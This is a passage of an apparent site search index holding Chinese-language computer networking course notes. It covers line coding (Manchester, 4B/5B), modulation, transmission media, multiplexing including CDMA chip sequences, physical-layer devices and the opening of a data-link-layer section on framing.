\u5c31\u91c7\u7528\u4e86 NRZI \u7f16\u7801</li> </ul> </li> <li>\u66fc\u5f7b\u65af\u7279\u7f16\u7801: \u6bcf\u4e2a\u7801\u5143\u4e2d\u95f4\u90fd\u4f1a\u53d1\u751f\u8df3\u53d8\uff0c\u4e14\u4e8c\u8fdb\u5236\u6570\u636e\u8df3\u53d8\u65f6\u7535\u5e73\u4fdd\u6301\u4e0d\u53d8<ul> <li>\u53ef\u4ee5\u7528\u5411\u4e0b\u8df3\u53d8\u8868\u793a 1\uff0c\u5411\u4e0a\u8df3\u53d8\u8868\u793a 0\uff1b\u6216\u8005\u76f8\u53cd\u7684\u89c4\u5b9a</li> <li>\u7801\u5143\u4e2d\u95f4\u7684\u7535\u5e73\u8df3\u53d8\u53ca\u4f5c\u4e3a\u65f6\u949f\u4fe1\u53f7\u7528\u4e8e\u540c\u6b65\uff0c\u4e5f\u4f5c\u4e3a\u6570\u636e\u4fe1\u53f7\u8868\u793a\u6570\u636e</li> <li>\u6807\u51c6\u4ee5\u592a\u7f51\u91c7\u7528\u4e86\u66fc\u5f7b\u65af\u7279\u7f16\u7801</li> </ul> </li> <li>\u5dee\u5206\u66fc\u5f7b\u65af\u7279\u7f16\u7801: \u6bcf\u4e2a\u7801\u5143\u4e2d\u95f4\u90fd\u4f1a\u53d1\u751f\u8df3\u53d8\uff0c\u6bcf\u4e2a\u7801\u5143\u5f00\u59cb\u5904\u65e0\u8df3\u53d8\u8868\u793a 1\uff0c\u6709\u8df3\u53d8\u8868\u793a 0<ul> <li>\u7801\u5143\u4e2d\u95f4\u7684\u7535\u5e73\u8df3\u53d8\u4ec5\u8868\u793a\u65f6\u949f\u4fe1\u53f7\uff0c\u800c\u4e0d\u8868\u793a\u6570\u636e</li> <li>\u7531\u4e8e\u5177\u6709\u66f4\u5f3a\u7684\u6297\u5e72\u6270\u80fd\u529b\uff0c\u5dee\u5206\u66fc\u5f7b\u65af\u7279\u7f16\u7801\u5e7f\u6cdb\u7528\u4e8e\u5bbd\u5e26\u9ad8\u901f\u7f51\u4e2d</li> </ul> </li> </ul> <p>\u9664\u6b64\u4e4b\u5916\uff0c\u8bfe\u4ef6\u4e2d\u8fd8\u4ecb\u7ecd\u4e86 4B/5B \u7f16\u7801\u65b9\u6848\uff0c\u5b83\u4f7f\u7528 5-bit \u7684\u7801\u5143\u8868\u793a 4-bit \u7684\u6570\u636e\uff0c\u5177\u4f53\u7684\u6620\u5c04\u5982\u4e0b\uff1a</p> Data (4B) Codeword (5B) Data (4B) Codeword (5B) 0000 11110 1000 10010 0001 01001 1001 10011 0010 10100 1010 10110 0011 10101 1011 10111 0100 01010 1100 11010 0101 01011 1101 11011 0110 01110 1110 11100 0111 01111 1111 11101 <p>\u5176\u7279\u70b9\u662f 5 \u6bd4\u7279\u7801\u7ec4\u4e2d\u81f3\u5c11\u5305\u542b\u4e24\u4e2a 1\uff0c\u81f3\u591a\u5305\u542b 3 \u4e2a 0\uff0c\u907f\u514d\u957f\u65f6\u95f4\u4e0d\u8df3\u53d8\uff0c\u4ee5\u6b64\u8fbe\u5230\u786e\u4fdd\u53ef\u4ee5\u6062\u590d\u65f6\u949f\u5e76\u8fdb\u884c\u540c\u6b65\u7684\u6548\u679c\u3002</p> <p>\u4e3a\u4e86\u589e\u5f3a\u53ef\u9760\u6027\uff0c4B/5B \u7f16\u7801\u989d\u5916\u4f7f\u7528\u4e86 1-bit \u7f16\u7801\u5f00\u9500\uff0c\u56e0\u6b64\u5b83\u7684\u7f16\u7801\u6548\u7387\u4e3a \\(\\frac{4}{5}=80\\%\\)\u3002</p> <p>\u3010Example\u3011 \u5728\u5feb\u901f\u4ee5\u592a\u7f51\u4e2d\uff0c\u5982\u679c\u6570\u636e\u4f20\u8f93\u7387\u8981\u8fbe\u5230 100Mbps\uff0c\u91c7\u7528 4B/5B \u7f16\u7801\u9700\u8981\u591a\u5c11\u6ce2\u7279\u7387\uff1f</p> \\[ \\text{\u7f16\u7801\u540e\u7684\u4fe1\u53f7\u6ce2\u7279\u7387}=\\text{\u6570\u636e\u4f20\u8f93\u7387} / \\text{\u7f16\u7801\u6548\u7387} = 125 M\\ Baud \\] <p>\u66fc\u5f7b\u65af\u7279\u7f16\u7801\u7684\u7f16\u7801\u6548\u7387\u4e3a 50%\uff0c\u56e0\u4e3a\u5b83\u7528 2-bit \u7801\u5143\u8868\u793a 1-bit \u6570\u636e</p> <p>\u5c06\u6a21\u62df\u6570\u636e\u7f16\u7801\u4e3a\u6570\u5b57\u4fe1\u53f7\uff0c\u4e3b\u8981\u5305\u62ec\u91c7\u6837\u3001\u91cf\u5316\u3001\u7f16\u7801\u4e09\u4e2a\u6b65\u9aa4\uff0c\u6b64\u5904\u4e0d\u662f\u91cd\u70b9\u3002</p>"},{"location":"Courses/CN/Topic1/#_5","title":"\u8c03\u5236","text":"<p>\u53d1\u9001\u7aef\u5c06\u6570\u5b57\u4fe1\u53f7\u8f6c\u6362\u4e3a\u6a21\u62df\u4fe1\u53f7\uff0c\u800c\u63a5\u6536\u7aef\u5c06\u6a21\u62df\u4fe1\u53f7\u8fd8\u539f\u4e3a\u6570\u5b57\u4fe1\u53f7\uff0c\u5206\u522b\u5bf9\u5e94\u4e86\u8c03\u5236\u89e3\u8c03\u5668\u7684\u8c03\u5236\u548c\u89e3\u8c03\u7684\u8fc7\u7a0b\u3002\u8c03\u5e45\u3001\u8c03\u9891\u3001\u8c03\u76f8\u662f\u6570\u5b57\u8c03\u5236\u7684\u4e09\u79cd\u65b9\u5f0f\uff1a</p> <p></p> <p>\u4e09\u79cd\u8c03\u5236\u6280\u672f\u5206\u522b\u5bf9\u5e94\u4e86\u8f7d\u6ce2 \\(A\\sin (\\omega t +\\phi)\\) \u7684\u5e45\u5ea6\u3001\u9891\u7387\u548c\u76f8\u4f4d\uff1a</p> <ul> <li>\u8c03\u5e45 AM / \u5e45\u79fb\u952e\u63a7 ASK \u901a\u8fc7\u6539\u53d8\u8f7d\u6ce2\u7684\u632f\u5e45\u8868\u793a\u6570\u5b57\u4fe1\u53f7 1 \u6216 0\uff0c\u5bb9\u6613\u5b9e\u73b0\u4f46\u6297\u5e72\u6270\u80fd\u529b\u5dee</li> <li>\u8c03\u9891 FM / \u9891\u79fb\u952e\u63a7 FSK \u901a\u8fc7\u6539\u53d8\u8f7d\u6ce2\u7684\u9891\u7387\u8868\u793a\u6570\u5b57\u4fe1\u53f7 1 \u548c 0\uff0c\u5bb9\u6613\u5b9e\u73b0\u4e14\u6297\u5e72\u6270\u80fd\u529b\u5f3a\uff0c\u5e94\u7528\u5e7f\u6cdb</li> <li>\u8c03\u76f8 PM / \u76f8\u79fb\u952e\u63a7 PSK \u901a\u8fc7\u6539\u53d8\u8f7d\u6ce2\u7684\u76f8\u4f4d\u8868\u793a\u6570\u5b57\u4fe1\u53f7 1 \u548c 0\uff0c\u6297\u5e72\u6270\u80fd\u529b\u5f3a\u4f46\u4e0d\u5bb9\u6613\u5b9e\u73b0</li> </ul>"},{"location":"Courses/CN/Topic1/#_6","title":"\u4f20\u8f93\u4ecb\u8d28","text":"<p>\u4f20\u8f93\u4ecb\u8d28\u662f\u53d1\u9001\u5668\u548c\u63a5\u6536\u5668\u4e4b\u95f4\u7684\u7269\u7406\u901a\u8def\u53ef\u5206\u4e3a\u4e24\u5927\u7c7b\uff1a</p> <ul> <li>\u5bfc\u5f15\u578b\u4f20\u8f93\u4ecb\u8d28 \u6307\u7535\u78c1\u6ce2\u88ab\u5bfc\u5411\u6cbf\u7740\u67d0\u4e00\u5a92\u4f53\u4f20\u8f93<ul> <li>\u53cc\u7ede\u7ebf\uff0c\u540c\u8f74\u7535\u7f06\uff0c\u7535\u529b\u7ebf\u548c\u5149\u7ea4\u7b49</li> </ul> </li> <li>\u975e\u5bfc\u5f15\u578b\u4f20\u8f93\u4ecb\u8d28 \u6307\u7535\u78c1\u6ce2\u5728\u5927\u6c14\u5c42\u3001\u5916\u5c42\u7a7a\u95f4\u6216\u6d77\u6d0b\u4e2d\u8fdb\u884c\u7684\u65e0\u7ebf\u4f20\u64ad<ul> <li>\u77ed\u6ce2\u4f20\u8f93\uff0c\u5730\u9762\u5fae\u6ce2\uff0c\u536b\u661f\u5fae\u6ce2\uff0c\u5e7f\u64ad\u4f20\u8f93\u7b49</li> </ul> </li> </ul>"},{"location":"Courses/CN/Topic1/#_7","title":"\u5bfc\u5f15\u578b\u4f20\u8f93\u4ecb\u8d28","text":"<p>\u53cc\u7ede\u7ebf</p> <p>\u53cc\u7ede\u7ebf\u662f\u6700\u5e38\u7528\u7684\u4f20\u8f93\u4ecb\u8d28\uff0c\u7531\u4e24\u6839\u91c7\u7528\u4e00\u5b9a\u89c4\u5219\u5e76\u6392\u7ede\u5408\u3001\u76f8\u4e92\u7edd\u7f18\u7684\u94dc\u5bfc\u7ebf\u7ec4\u6210\u3002\u901a\u5e38\u591a\u8ddf\u53cc\u7ede\u7ebf\u4f1a\u518d\u88ab\u7ede\u5408\uff0c\u5f62\u6210\u7535\u7f06\u72b6\u3002</p> <p>\u7ede\u5408\u662f\u4e3a\u4e86\u51cf\u5c11\u5bf9\u76f8\u90bb\u5bfc\u7ebf\u7684\u7535\u78c1\u5e72\u6270</p> <p>\u53cc\u7ede\u7ebf\u4ef7\u683c\u504f\u79fb\uff0c\u540c\u65f6\u9002\u7528\u4e8e\u6a21\u62df\u4f20\u8f93\u548c\u6570\u5b57\u4f20\u8f93\uff0c\u901a\u4fe1\u8ddd\u79bb\u4e00\u822c\u4e3a\u51e0\u5343\u7c73\u5230\u6570\u5341\u5343\u7c73\u3002\u53cc\u7ede\u7ebf\u7684\u5e26\u5bbd\u53d6\u51b3\u4e8e\u94dc\u7ebf\u7684\u7c97\u7ec6\u548c\u4f20\u8f93\u7684\u8ddd\u79bb\u3002</p> <p>\u540c\u8f74\u7535\u7f06</p> <p>\u540c\u8f74\u7535\u7f06\u7531\u5185\u5bfc\u4f53\u3001\u7edd\u7f18\u5c42\u3001\u5916\u5bfc\u4f53\u5c4f\u853d\u5c42\u548c\u7edd\u7f18\u4fdd\u62a4\u5957\u5c42\u6784\u6210\uff1a</p> <p></p> <p>\u6309\u7167\u7279\u6027\u963b\u6297\u7684\u4e0d\u540c\uff0c\u53ef\u5206\u4e3a\u57fa\u5e26\u540c\u8f74\u7535\u7f06\uff0850\u03a9\uff09\u548c\u5bbd\u5e26\u540c\u8f74\u7535\u7f06\uff0875\u03a9\uff09</p> <ul> <li>\u57fa\u5e26\u540c\u8f74\u7528\u4e8e\u4f20\u9001\u57fa\u5e26\u4fe1\u53f7\uff0c\u8ddd\u79bb\u53ef\u8fbe 1km\uff0c\u4f20\u8f93\u901f\u7387\u4e3a 10Mbps</li> <li>\u5bbd\u5e26\u540c\u8f74\u662f\u6709\u7ebf\u7535\u89c6\u7684\u6807\u51c6\u4f20\u8f93\u7535\u7f06\uff0c\u4f20\u9001\u9891\u5206\u590d\u7528\u7684\u5bbd\u5e26\u4fe1\u53f7\uff0c\u4fe1\u53f7\u9891\u7387\u53ef\u8fbe 300-400 MHz\uff0c\u8ddd\u79bb\u53ef\u8fbe 100km</li> </ul> <p>\u540c\u8f74\u7535\u7f06\u5177\u6709\u5bff\u547d\u957f\u3001\u5bb9\u91cf\u5927\u3001\u4f20\u8f93\u7a33\u5b9a\u3001\u5916\u754c\u5e72\u6270\u5c0f\u3001\u7ef4\u62a4\u65b9\u4fbf\u7b49\u7279\u70b9\uff0c\u4f46\u73b0\u5728\u5c40\u57df\u7f51\u9886\u57df\u57fa\u672c\u90fd\u91c7\u7528\u53cc\u7ede\u7ebf\u90fd\u4f5c\u4e3a\u4f20\u8f93\u4ecb\u8d28\u3002</p> <p>\u5149\u7ea4</p> <p>\u5149\u7ea4\u901a\u4fe1\u5229\u7528\u5149\u5bfc\u7ea4\u7ef4\u53ef\u4ee5\u4f20\u9012\u5149\u8109\u51b2\u8fdb\u884c\u901a\u4fe1\uff0c\u6709\u5149\u8109\u51b2\u5219\u4e3a 1\uff0c\u65e0\u5149\u8109\u51b2\u5219\u4e3a 0\u3002</p> <p>\u53ef\u89c1\u5149\u7684\u9891\u7387\u6570\u91cf\u7ea7\u4e3a \\(10^8\\) Hz\uff0c\u56e0\u6b64\u5149\u7ea4\u7684\u5e26\u5bbd\u6781\u5927</p> <p>\u5149\u7ea4\u6709\u7ea4\u82af\u548c\u5305\u5c42\u6784\u6210\uff0c\u5305\u5c42\u8f83\u7ea4\u82af\u5177\u6709\u8f83\u4f4e\u7684\u6298\u5c04\u7387\uff0c\u5149\u7ea4\u5229\u7528\u4e86\u5149\u7684\u5168\u53cd\u5c04\u7279\u6027\u8fdb\u884c\u5149\u8109\u51b2\u4fe1\u53f7\u4f20\u8f93\u3002</p> <p></p> <p>\u591a\u6a21\u5149\u7ea4\u5141\u8bb8\u8ba9\u591a\u6761\u5149\u7ebf\u4ee5\u4e0d\u540c\u89d2\u5ea6\u5165\u5c04\u540c\u4e00\u6839\u5149\u7ea4\uff0c\u5176\u5149\u8109\u51b2\u635f\u8017\u66f4\u9ad8\uff0c\u5e26\u5bbd\u8f83\u7a84\uff0c\u9002\u7528\u4e8e\u5c0f\u5bb9\u91cf\u8fd1\u8ddd\u79bb\u4f20\u8f93\u3002</p> <p>\u800c\u5355\u6a21\u5149\u7ea4\u7684\u76f4\u5f84\u5c0f\u5230\u53ea\u6709\u4e00\u4e2a\u5149\u7684\u6ce2\u957f\uff0c\u5149\u7ebf\u5728\u5176\u4e2d\u4ee5\u76f4\u7ebf\u5411\u524d\u4f20\u64ad\uff0c\u4e0d\u4ea7\u751f\u591a\u6b21\u53cd\u5c04\u3002\u5355\u6a21\u5149\u7ea4\u7684\u5236\u4f5c\u6210\u672c\u8f83\u9ad8\uff0c\u4f46\u662f\u8870\u51cf\u5f88\u5c0f\uff0c\u9002\u5408\u8fdc\u8ddd\u79bb\u4f20\u8f93\u3002</p> <p>\u5904\u7406\u5e26\u5bbd\u975e\u5e38\u5927\u7684\u4f18\u70b9\uff0c\u5149\u7ea4\u901a\u4fe1\u8fd8\u5177\u6709\u4ee5\u4e0b\u7279\u70b9\uff1a</p> <ol> <li>\u4f20\u8f93\u635f\u8017\u5c0f\uff0c\u4e2d\u7ee7\u8ddd\u79bb\u957f</li> <li>\u6297\u96f7\u7535\u548c\u7535\u78c1\u5e72\u6270\u6027\u80fd\u597d</li> <li>\u4e0d\u6613\u88ab\u7a83\u542c\u6216\u622a\u53d6</li> <li>\u4f53\u79ef\u5c0f\uff0c\u91cd\u91cf\u8f7b</li> </ol>"},{"location":"Courses/CN/Topic1/#_8","title":"\u65e0\u7ebf\u4f20\u8f93\u4ecb\u8d28","text":"<p>\u65e0\u7ebf\u7535\u6ce2</p> <p>\u65e0\u7ebf\u7535\u6ce2\u5177\u6709\u8f83\u5f3a\u7684\u7a7f\u900f\u80fd\u529b\uff0c\u53ef\u4ee5\u4f20\u8f93\u5f88\u957f\u7684\u8ddd\u79bb\u3002\u7531\u4e8e\u65e0\u7ebf\u7535\u6ce2\u4fe1\u53f7\u5411\u6240\u6709\u65b9\u5411\u6563\u64ad\uff0c\u6709\u6548\u8ddd\u79bb\u5185\u7684\u63a5\u6536\u8bbe\u5907\u65e0\u9700\u5bf9\u51c6\u67d0\u4e2a\u65b9\u5411\u5c31\u53ef\u4ee5\u8fdb\u884c\u901a\u4fe1\u8fde\u63a5\u3002</p> <p>\u76ee\u524d\u5e7f\u6cdb\u5e94\u7528\u4e8e\u901a\u4fe1\u9886\u57df\uff0c\u4f8b\u5982\u65e0\u7ebf\u624b\u673a\u901a\u4fe1\u3001\u65e0\u7ebf\u5c40\u57df\u7f51\uff08WLAN\uff09\u7b49\u3002</p> <p>\u5fae\u6ce2\u3001\u7ea2\u5916\u7ebf\u3001\u6fc0\u5149</p> <p>\u5fae\u6ce2\u3001\u7ea2\u5916\u7ebf\u3001\u6fc0\u5149\u662f\u76ee\u524d\u4e3b\u8981\u4f7f\u7528\u7684\u4e09\u79cd\u9ad8\u5e26\u5bbd\u65e0\u7ebf\u901a\u4fe1\uff0c\u4ed6\u4eec\u5177\u6709\u5f88\u5f3a\u7684\u6307\u5411\u6027\uff0c\u8981\u6c42\u53d1\u9001\u65b9\u548c\u63a5\u6536\u65b9\u4e4b\u95f4\u6709\u4e00\u6761\u89c6\u7ebf\u901a\u8def\u3002</p> <p>\u536b\u661f\u901a\u4fe1\u5229\u7528\u5730\u7403\u540c\u6b65\u536b\u661f\u4f5c\u4e3a\u4e2d\u7ee7\u7ad9\u6765\u8f6c\u53d1\u5fae\u6ce2\u4fe1\u53f7\uff0c\u53ef\u4ee5\u7a81\u7834\u5730\u9762\u5fae\u6ce2\u901a\u4fe1\u8ddd\u79bb\u7684\u9650\u5236\u3002\u536b\u661f\u901a\u4fe1\u7684\u4f18\u70b9\u662f\u901a\u4fe1\u5bb9\u91cf\u5927\u3001\u8ddd\u79bb\u8fdc\u3001\u8986\u76d6\u5e7f\uff0c\u7f3a\u70b9\u662f\u4fdd\u5bc6\u6027\u5dee\uff0c\u7aef\u5230\u7aef\u4f20\u64ad\u65f6\u5ef6\u957f\u3002</p>"},{"location":"Courses/CN/Topic1/#_9","title":"\u591a\u8def\u590d\u7528","text":"<p>\u4fe1\u9053\u8d44\u6e90\u662f\u6709\u9650\u7684\uff0c\u5b9e\u9645\u7f51\u7edc\u4e2d\uff0c\u591a\u5bf9\u7528\u6237\u5f80\u5f80\u9700\u8981\u5229\u7528\u76f8\u540c\u7684\u4fe1\u9053\u8d44\u6e90\u4f20\u8f93\u4fe1\u606f\u3002</p> <p>\u590d\u7528\uff08multiplexing\uff09\u6280\u672f\u5141\u8bb8\u7528\u6237\u4f7f\u7528\u4e00\u4e2a\u5171\u4eab\u4fe1\u9053\u8fdb\u884c\u901a\u4fe1\uff0c\u63d0\u9ad8\u4e86\u5229\u7528\u7387\u3002</p> <p>\u65f6\u5206\u590d\u7528 TDM</p> <p>Time Division Multiplexing \u5c06\u4fe1\u9053\u7684\u4f20\u8f93\u65f6\u95f4\u5212\u5206\u4e3a\u4e00\u6bb5\u6bb5\u7b49\u957f\u7684\u65f6\u95f4\u7247\uff0c\u79f0\u4e3a TDM \u5e27\uff0c\u6bcf\u4e2a\u7528\u6237\u5728\u6bcf\u4e2a TDM \u5e27\u4e2d\u5360\u7528\u56fa\u5b9a\u5e8f\u53f7\u7684\u65f6\u9699\u3002</p> <p></p> <p>\u5f53\u7528\u6237\u5728\u67d0\u6bb5\u65f6\u95f4\u65e0\u6570\u636e\u4f20\u8f93\uff0c\u5176\u4ed6\u7528\u6237\u4e5f\u65e0\u6cd5\u4f7f\u7528\u8fd9\u4e2a\u6682\u65f6\u7a7a\u95f2\u7684\u7ebf\u8def\u8d44\u6e90\uff0c\u6240\u4ee5\u65f6\u5206\u590d\u7528\u7684\u4fe1\u9053\u5229\u7528\u7387\u4e0d\u9ad8\u3002</p> <p>\u53e6\u5916\u6709\u4e00\u79cd\u7edf\u8ba1\u65f6\u5206\u590d\u7528 Statistic TDM\uff0c\u5b83\u5141\u8bb8\u52a8\u6001\u5206\u914d\u65f6\u9699\uff0c\u5f53\u6709\u7528\u6237\u6709\u6570\u636e\u9700\u8981\u4f20\u9001\u65f6\u624d\u4f1a\u5206\u914d\u5230\u65f6\u9699\u3002</p> <p>\u9891\u5206\u590d\u7528 FDM</p> <p>Frequency Division Multiplexing \u5c06\u4fe1\u9053\u7684\u603b\u9891\u5212\u5206\u4e3a\u591a\u4e2a\u5b50\u4fe1\u9053\uff0c\u6bcf\u5bf9\u7528\u6237\u4f7f\u7528\u5176\u4e2d\u4e00\u4e2a\u5b50\u4fe1\u9053\u8fdb\u884c\u901a\u4fe1\u3002\u6240\u6709\u7528\u6237\u5728\u540c\u4e00\u65f6\u95f4\u5360\u7528\u4e0d\u540c\u9891\u5e26\u8d44\u6e90\uff0c\u76f8\u90bb\u4fe1\u9053\u4e4b\u95f4\u8fd8\u8981\u52a0\u5165\u9694\u79bb\u9891\u5e26\uff0c\u9632\u6b62\u76f8\u4e92\u5e72\u6270\u3002</p> <p></p> <p>\u9891\u5206\u590d\u7528\u7684\u4f18\u70b9\u5728\u4e8e\u5145\u5206\u5229\u7528\u4e86\u4ecb\u8d28\u7684\u5e26\u5bbd\uff0c\u7cfb\u7edf\u6548\u7387\u8f83\u9ad8\uff0c\u5b9e\u73b0\u4e5f\u8f83\u5bb9\u6613\u3002</p> <p>\u6ce2\u5206\u590d\u7528 WDM</p> <p>Wavelength Division Multiplexing \u5373\u5149\u7684\u9891\u5206\u590d\u7528\uff0c\u5229\u7528\u5149\u7684\u4e0d\u540c\u6ce2\u957f\u3002\u5b83\u5728\u4e00\u6839\u5149\u7ea4\u79cd\u4f20\u8f93\u591a\u79cd\u6ce2\u957f\u7684\u5149\u4fe1\u53f7\uff0c\u6700\u540e\u7528\u5149\u5206\u5668\u5c06\u5404\u8def\u6ce2\u957f\u5206\u89e3\u51fa\u6765\u3002</p> <p>\u7801\u5206\u590d\u7528 CDM / \u7801\u5206\u591a\u5740 CDMA</p> <p>Code Division Multiplexing / Code Division Multiple Access \u91c7\u7528\u4e0d\u540c\u7f16\u7801\u6765\u533a\u5206\u5404\u8def\u539f\u59cb\u4fe1\u53f7\uff0c\u4e0e\u524d\u4e09\u8005\u4e0d\u540c\uff0c\u5b83\u65e2\u5171\u4eab\u4fe1\u9053\uff0c\u53c8\u5171\u4eab\u65f6\u95f4\u3002</p> <p>\u5b83\u4e3a\u6bcf\u4e2a\u7ad9\u70b9\u5206\u914d\u4e00\u4e2a\u6307\u5b9a\u7684 m \u4f4d\u7801\u7247\u5e8f\u5217\uff0c\u5e76\u4e14\u4fdd\u8bc1\uff1a</p> <ul> <li>\u4e0d\u540c\u7ad9\u7684\u7801\u7247\u5e8f\u5217\u76f8\u4e92\u6b63\u4ea4\uff0c\u89c4\u683c\u5316\u5185\u79ef\u4e3a 0<ul> <li>\\(S\\cdot T= \\frac{1}{m} \\sum_{i=1}^m S_i T_i = 0\\)</li> </ul> </li> <li>\u540c\u4e00\u7ad9\u7801\u7247\u5e8f\u5217\u81ea\u8eab\u7684\u89c4\u683c\u5316\u5185\u79ef\u4e3a 1<ul> <li>\\(S\\cdot S = \\frac{1}{m}\\sum_{i=1}^m S_i S_i = \\frac{1}{m}\\sum_{i=1} ^m (\\pm 1)^2 = 1\\)</li> </ul> </li> </ul> <p>\u8fd9\u6837\u591a\u4e2a\u7ad9\u70b9\u7684\u7801\u7247\u5728\u516c\u5171\u4fe1\u9053\u7ebf\u6027\u53e0\u52a0\u540e\uff0c\u53ef\u4ee5\u901a\u8fc7\u89c4\u683c\u5316\u5185\u79ef\u8fdb\u884c\u6570\u636e\u5206\u79bb\u3002</p> <p>\u5982\u679c\u89c4\u683c\u5316\u5185\u79ef\u7ed3\u679c\u4e3a 1\uff0c\u5219\u8bf4\u660e\u8be5\u7ad9\u70b9\u53d1\u9001\u4e86\u4fe1\u53f7 1\uff1b\u5982\u679c\u89c4\u683c\u5316\u5185\u79ef\u4e3a -1\uff0c\u5219\u8bf4\u660e\u8be5\u7ad9\u70b9\u53d1\u9001\u4e86\u4fe1\u53f7 0\uff1b\u5982\u679c\u89c4\u683c\u5316\u5185\u79ef\u4e3a 0\uff0c\u5219\u8bf4\u660e\u8be5\u7ad9\u70b9\u6ca1\u6709\u53d1\u9001\u4fe1\u606f\u3002</p>"},{"location":"Courses/CN/Topic1/#_10","title":"\u7269\u7406\u5c42\u8bbe\u5907","text":"<p>\u4e2d\u7ee7\u5668\u548c\u96c6\u7ebf\u5668\u662f\u7269\u7406\u5c42\u7684\u4e3b\u8981\u8bbe\u5907\u3002\u4f7f\u7528\u4e2d\u7ee7\u5668\u548c\u96c6\u7ebf\u5668\u8fde\u63a5\u7684\u51e0\u4e2a\u7f51\u6bb5\u4ecd\u662f\u4e00\u4e2a\u5c40\u57df\u7f51\u3002</p> <p>\u4e2d\u7ee7\u5668\u7684\u4e3b\u8981\u529f\u80fd\u662f\u653e\u5927\u3001\u6574\u5f62\u5e76\u8f6c\u53d1\u4fe1\u53f7\uff0c\u4ee5\u6d88\u9664\u4fe1\u53f7\u7ecf\u8fc7\u4e00\u957f\u6bb5\u7535\u7f06\u540e\u4ea7\u751f\u7684\u5931\u771f\u548c\u8870\u51cf\uff0c\u4f7f\u4fe1\u53f7\u7684\u6ce2\u5f62\u548c\u5f3a\u5ea6\u8fbe\u5230\u6240\u9700\u7684\u8981\u6c42\u3002</p> <p>\u96c6\u7ebf\u5668\u672c\u8d28\u662f\u4e00\u4e2a\u591a\u7aef\u53e3\u7684\u4e2d\u7ee7\u5668\uff0c\u5f53\u4e00\u4e2a\u7aef\u53e3\u63a5\u6536\u5230\u6570\u636e\u4fe1\u53f7\u540e\uff0c\u96c6\u7ebf\u5668\u5bf9\u8be5\u4fe1\u53f7\u8fdb\u884c\u6574\u5f62\u653e\u5927\uff0c\u7136\u540e\u8f6c\u53d1\u5230\u5176\u5b83\u6240\u6709\u5904\u4e8e\u5de5\u4f5c\u72b6\u6001\u7684\u7aef\u53e3\u4e0a\uff08\u9664\u4e86\u8f93\u5165\u7aef\u53e3\uff09\u3002</p> <p>\u6839\u636e\u96c6\u7ebf\u5668\u7684\u5de5\u4f5c\u539f\u7406\uff0c\u6211\u4eec\u4e0d\u96be\u770b\u51fa\u5982\u679c\u540c\u65f6\u5b58\u5728\u4e24\u4e2a\u6216\u4ee5\u4e0a\u7aef\u53e3\u8f93\u5165\uff0c\u5219\u8f93\u51fa\u65f6\u5c06\u53d1\u751f\u51b2\u7a81\uff0c\u56e0\u6b64\u96c6\u7ebf\u5668\u53ea\u80fd\u5728\u534a\u53cc\u5de5\u72b6\u6001\u4e0b\u5de5\u4f5c\u3002</p>"},{"location":"Courses/CN/Topic2/","title":"\u6570\u636e\u94fe\u8def\u5c42","text":""},{"location":"Courses/CN/Topic2/#_1","title":"\u6570\u636e\u94fe\u8def\u5c42","text":"<p> \u7ea6 7455 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 37 \u5206\u949f</p>"},{"location":"Courses/CN/Topic2/#_2","title":"\u529f\u80fd","text":"<p>\u6570\u636e\u94fe\u8def\u5c42\u5229\u7528\u7269\u7406\u5c42\u63d0\u4f9b\u7684\u4f4d\u6d41\u670d\u52a1\uff0c\u5411\u7f51\u7edc\u5c42\u63d0\u4f9b\u4e86\u660e\u786e\u7684\u670d\u52a1\u63a5\u53e3\u3002\u5176\u4e3b\u8981\u529f\u80fd\u5982\u4e0b\uff1a</p> <ul> <li>&lt;1&gt; \u5c01\u88c5\u6210\u5e27<ul> <li>\u5728\u4e00\u6bb5\u6570\u636e\u524d\u540e\u6dfb\u52a0\u9996\u90e8\u548c\u5c3e\u90e8\uff0c\u6784\u6210 Frame\uff0c\u662f\u6570\u636e\u94fe\u8def\u5c42\u7684 PDU</li> </ul> </li> <li>&lt;2&gt; \u5dee\u9519\u68c0\u6d4b<ul> <li>\u56e0\u4e3a\u4fe1\u9053\u566a\u58f0\u7b49\u539f\u56e0\uff0c\u5e27\u5728\u4f20\u8f93\u8fc7\u7a0b\u4e2d\u53ef\u80fd\u51fa\u73b0\u9519\u8bef</li> <li>1) \u4f4d\u9519: \u5e27\u4e2d\u67d0\u4e9b\u4f4d\u51fa\u73b0\u5dee\u9519</li> <li>2) \u5e27\u9519: \u5e27\u4e22\u5931\u3001\u5e27\u91cd\u590d\u6216\u5e27\u5931\u5e8f\u7b49\uff0c\u5c5e\u4e8e\u4f20\u8f93\u5dee\u9519</li> </ul> </li> <li>&lt;3&gt; \u6d41\u91cf\u63a7\u5236<ul> <li>\u94fe\u8def\u4e24\u7aef\u7684\u5de5\u4f5c\u901f\u7387\u548c\u7f13\u5b58\u7a7a\u95f4\u5b58\u5728\u5dee\u5f02\uff0c\u53ef\u80fd\u5b58\u5728\u53d1\u9001\u65b9\u7684\u53d1\u9001\u80fd\u529b\u5927\u4e8e\u63a5\u6536\u65b9\u7684\u63a5\u6536\u80fd\u529b\uff0c\u56e0\u6b64\u6d41\u91cf\u63a7\u5236\u901a\u8fc7\u67d0\u79cd\u53cd\u9988\u673a\u5236\u9650\u5236\u53d1\u9001\u65b9\u7684\u53d1\u9001\u901f\u7387</li> </ul> </li> </ul>"},{"location":"Courses/CN/Topic2/#_3","title":"\u5c01\u88c5\u6210\u5e27","text":"<p>\u53d1\u9001\u65b9\u4f9d\u636e\u4e00\u5b9a\u89c4\u5219\uff0c\u5c06\u7f51\u7edc\u5c42\u9012\u4ea4\u4e0b\u6765\u7684\u5206\u7ec4\u5c01\u88c5\u6210\u5e27\u3002\u7ec4\u5e27\u4e3b\u8981\u9700\u8981\u89e3\u51b3\u5e27\u5b9a\u754c\u3001\u5e27\u540c\u6b65\u3001\u900f\u660e\u4f20\u8f93\u7b49\u95ee\u9898\u3002</p> <p>\u5b9e\u73b0\u7ec4\u5e27\u7684\u65b9\u6cd5\u4e3b\u8981\u6709\u4ee5\u4e0b\u56db\u79cd\uff1a</p> <p>\u5b57\u8282\u8ba1\u6570\u6cd5 Byte Count</p> <p>\u5b57\u8282\u8ba1\u6570\u6cd5\u5728\u5e27\u9996\u90e8\u8bbe\u7f6e\u4e00\u4e2a\u8ba1\u6570\u5b57\u6bb5\uff0c\u8bb0\u5f55\u8be5\u5e27\u542b\u6709\u7684\u5b57\u8282\u6570\uff08\u5305\u62ec\u8ba1\u6570\u5b57\u6bb5\u672c\u8eab\u5360\u7528\u7684 1 